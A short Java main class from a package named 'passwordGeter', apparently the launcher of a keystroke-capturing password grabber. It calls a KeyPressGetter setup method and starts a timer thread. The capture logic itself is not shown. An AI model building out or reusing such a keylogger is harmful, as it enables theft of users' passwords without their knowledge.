package cn.yenmor.passwordGeter;

public class Start {

	public static void main(String[] args) {
		// TODO Auto-generated method stub
		KeyPressGetter.setKeys();
		Thread t1 = new Thread(new Timer());
		t1.start();

	}
	

}
